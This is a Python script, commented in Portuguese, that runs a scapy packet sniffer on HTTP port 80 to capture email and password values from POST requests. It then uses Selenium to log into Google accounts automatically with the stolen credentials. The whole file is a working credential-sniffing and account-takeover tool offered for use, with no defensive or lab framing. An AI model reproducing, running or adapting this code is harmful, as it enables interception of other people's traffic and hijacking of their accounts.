import threading
import time

from scapy.all import sniff, Raw
from urllib.parse import unquote

from selenium import webdriver
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# VARIÁVEIS GLOBAIS
email = None
password = None


# ----------------------------------------------------
#   SNIFFER — roda em uma thread separada
# ----------------------------------------------------
def processar_pacotes(pacote):
    global email, password

    if pacote.haslayer(Raw):
        try:
            data = pacote[Raw].load.decode(errors="ignore").lower()

            if "post" in data:

                if "email=" in data:
                    raw = data.split("email=", 1)[1].split("&")[0]
                    email = unquote(raw)
                    print(f"[EMAIL CAPTURADO] {email}")

                if "passwd=" in data:
                    raw = data.split("passwd=", 1)[1].split("&")[0]
                    password = unquote(raw)
                    print(f"[SENHA CAPTURADA] {password}")

        except:
            pass


def iniciar_sniffer():
    print("[*] Sniffer ativo — aguardando POSTs...")
    sniff(filter="tcp port 80", prn=processar_pacotes, store=False)


def expand_shadow(driver, element):
    return driver.execute_script('return arguments[0].shadowRoot', element)

def realizar_login(email, password):
    print("\n[*] Iniciando Selenium...")
    print(f"[*] Tentando login com: {email} / {password}")

    try:
        print(f"[*] Tentando login com email = {email} e senha = {password}")

        driver = webdriver.Firefox(service=Service(GeckoDriverManager().install()))
        wait = WebDriverWait(driver, 20)

        driver.get("https://accounts.google.com/")

        # --- EMAIL ---
        email_input = wait.until(EC.presence_of_element_located((By.ID, "identifierId")))
        email_input.send_keys(email)

        driver.find_element(By.ID, "identifierNext").click()

        # --- SENHA ---
        # Espera a senha
        password_input = wait.until(
            EC.presence_of_element_located((By.NAME, "Passwd"))
        )
        password_input.send_keys(password)

        # Espera a div que contém o botão
        password_next_div = wait.until(
            EC.presence_of_element_located((By.ID, "passwordNext"))
        )

        # Clica com JavaScript dentro da div
        driver.execute_script("arguments[0].click();", password_next_div)

        print('[*] Login Successful...!!')

    except:
        print('[*] Login Failed')

def main():
    global email, password

    # Inicia o sniffer em thread separada
    thread_sniffer = threading.Thread(target=iniciar_sniffer, daemon=True)
    thread_sniffer.start()

    print("[*] Aguardando captura de email e senha...")

    # Espera até que email E senha estejam capturados
    while True:
        if email and password:
            print("[*] Credenciais completas capturadas!")
            break
        time.sleep(0.5)

    # Assim que capturou → executa login automático
    realizar_login(email, password)


if __name__ == "__main__":
    main()